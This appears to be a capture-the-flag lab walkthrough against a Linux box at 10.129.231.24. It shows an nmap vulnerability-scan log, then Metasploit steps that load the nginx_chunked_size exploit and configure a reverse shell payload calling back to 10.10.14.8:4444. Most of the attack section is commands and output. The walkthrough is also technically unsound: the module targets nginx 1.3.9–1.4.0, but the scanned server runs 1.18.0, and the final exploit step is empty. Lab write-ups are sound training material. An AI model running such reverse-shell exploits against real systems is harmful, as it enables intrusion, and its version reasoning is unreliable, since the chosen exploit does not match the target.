```jsx
Machine Number: 015700AA
Operating System: Linux
Difficulty: Easy
```

## Recon:

We'll start the things with a basic NMAP scan as shown in below.

```console                                                                                                                                                                                                                                           
┌──(MnM㉿kali)-[~/Desktop/HTB/Enterprise1]
└─$ sudo nmap -sC -sV -vv --script vuln 10.129.231.24
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-05 13:14 EDT
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 10.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Initiating Ping Scan at 13:14
Scanning 10.129.231.24 [4 ports]
Completed Ping Scan at 13:14, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:14
Completed Parallel DNS resolution of 1 host. at 13:14, 0.04s elapsed
Initiating SYN Stealth Scan at 13:14
Scanning 10.129.231.24 [1000 ports]
Discovered open port 22/tcp on 10.129.231.24
Discovered open port 80/tcp on 10.129.231.24
Increasing send delay for 10.129.231.24 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.231.24 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.129.231.24 from 10 to 20 due to 11 out of 32 dropped probes since last increase.
Increasing send delay for 10.129.231.24 from 20 to 40 due to 13 out of 42 dropped probes since last increase.
Increasing send delay for 10.129.231.24 from 40 to 80 due to 18 out of 59 dropped probes since last increase.
SYN Stealth Scan Timing: About 38.02% done; ETC: 13:15 (0:00:51 remaining)
Increasing send delay for 10.129.231.24 from 80 to 160 due to 22 out of 73 dropped probes since last increase.
SYN Stealth Scan Timing: About 63.68% done; ETC: 13:16 (0:00:48 remaining)
SYN Stealth Scan Timing: About 79.13% done; ETC: 13:16 (0:00:30 remaining)
Completed SYN Stealth Scan at 13:17, 171.44s elapsed (1000 total ports)
Initiating Service scan at 13:17
Scanning 2 services on 10.129.231.24
Completed Service scan at 13:17, 6.58s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.231.24.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:17
NSE Timing: About 97.80% done; ETC: 13:17 (0:00:01 remaining)
NSE Timing: About 98.53% done; ETC: 13:18 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:18 (0:00:00 remaining)
NSE Timing: About 99.63% done; ETC: 13:19 (0:00:00 remaining)
NSE Timing: About 99.63% done; ETC: 13:19 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:20 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:20 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:21 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:21 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:22 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:22 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:23 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:23 (0:00:01 remaining)
NSE Timing: About 99.63% done; ETC: 13:24 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:24 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:25 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:25 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:26 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:26 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:27 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:27 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:28 (0:00:02 remaining)
NSE Timing: About 99.63% done; ETC: 13:28 (0:00:03 remaining)
NSE Timing: About 99.63% done; ETC: 13:29 (0:00:03 remaining)
NSE Timing: About 99.63% done; ETC: 13:29 (0:00:03 remaining)
NSE Timing: About 99.63% done; ETC: 13:30 (0:00:03 remaining)
NSE Timing: About 99.63% done; ETC: 13:30 (0:00:03 remaining)                                                                                                                                                                              
NSE Timing: About 99.63% done; ETC: 13:31 (0:00:03 remaining)                                                                                                                                                                              
Completed NSE at 13:31, 851.36s elapsed                                                                                                                                                                                                    
NSE: Starting runlevel 2 (of 2) scan.                                                                                                                                                                                                      
Initiating NSE at 13:31                                                                                                                                                                                                                    
Completed NSE at 13:31, 2.03s elapsed                                                                                                                                                                                                      
Nmap scan report for 10.129.231.24                                                                                                                                                                                                         
Host is up, received echo-reply ttl 63 (0.28s latency).                                                                                                                                                                                    
Scanned at 2024-07-05 13:14:16 EDT for 1032s                                                                                                                                                                                               
Not shown: 997 closed tcp ports (reset)                                                                                                                                                                                                    
PORT     STATE    SERVICE REASON         VERSION                                                                                                                                                                                           
22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                                                                                                     
| vulners:                                                                                                                                                                                                                                 
|   cpe:/a:openbsd:openssh:8.2p1:                                                                                                                                                                                                          
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408                                                                                                                                                                     
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-80                       64A1575B23      *EXPLOIT*                                                                                                                                                                                                                  
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8                       DB5379A623      *EXPLOIT*                                                                                                    
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778                                                       
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*                                            
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*                    
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3A         F0523F3807      *EXPLOIT*                                                                                                    
|       CVE-2020-12062  7.5     https://vulners.com/cve/CVE-2020-12062                                                       
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*                            
|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3      *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207      *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp   open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.231.24
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.231.24:80/bets
|     Form id: gameid
|_    Form action: /bet
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
5500/tcp filtered hotline no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1043.14 seconds
```

The Nmap scan detected two open ports on the target host (10.129.231.24): port 22 running OpenSSH 8.2p1 (with multiple associated vulnerabilities) and port 80 running nginx 1.18.0. The scan also identified a potential CSRF vulnerability at the `/bets` endpoint on the web server. Additionally, port 5500 was filtered with no response. We'll use `msfconsole` to exploit `nginix` server's vulnerability.

```console
┌──(kali㉿kali)-[~]
└─$ msfconsole 
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __                                                                  
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                 
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                               
                                                                                                                             

       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1382 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Display the Framework log using the 
log command, learn more with help log
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search nginx

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/nginx_chunked_size           2013-05-07       great      Yes    Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow
   1  auxiliary/scanner/http/nginx_source_disclosure                   normal     No     Nginx Source Code Disclosure/Download
   2  exploit/multi/http/php_fpm_rce                  2019-10-22       normal     Yes    PHP-FPM Underflow RCE
   3  exploit/linux/http/roxy_wi_exec                 2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/roxy_wi_exec
```

We'll use the first module to exploit the machine. Inorder to load the module use the `use <module-number>` command and then we'll fill in the arguments.

```console
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/nginx_chunked_size) > show options

Module options (exploit/linux/http/nginx_chunked_size):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                       ng-metasploit.html
   RPORT    80               yes       The remote HTTP server port (TCP)


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.227.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Ubuntu 13.04 32bit - nginx 1.4.0



View the full module info with the info, or info -d command.
```

Use the following commands to fill in `RHOST`, `RPORT`, `LHOST`, `LPORT`, and `payload`.

```console
msf6 exploit(linux/http/nginx_chunked_size) > set RHOST 10.129.231.24
RHOST => 10.129.231.24
msf6 exploit(linux/http/nginx_chunked_size) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/nginx_chunked_size) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(linux/http/nginx_chunked_size) > set LHOST 10.10.14.8
LHOST => 10.10.14.8
msf6 exploit(linux/http/nginx_chunked_size) > set LPORT 4444
LPORT => 4444
msf6 exploit(linux/http/nginx_chunked_size) > show options

Module options (exploit/linux/http/nginx_chunked_size):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.129.231.24    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                       ng-metasploit.html
   RPORT    80               yes       The remote HTTP server port (TCP)


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.8       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Ubuntu 13.04 32bit - nginx 1.4.0



View the full module info with the info, or info -d command.
```

Now run the `exploit` command to execute the exploit.

```console

```
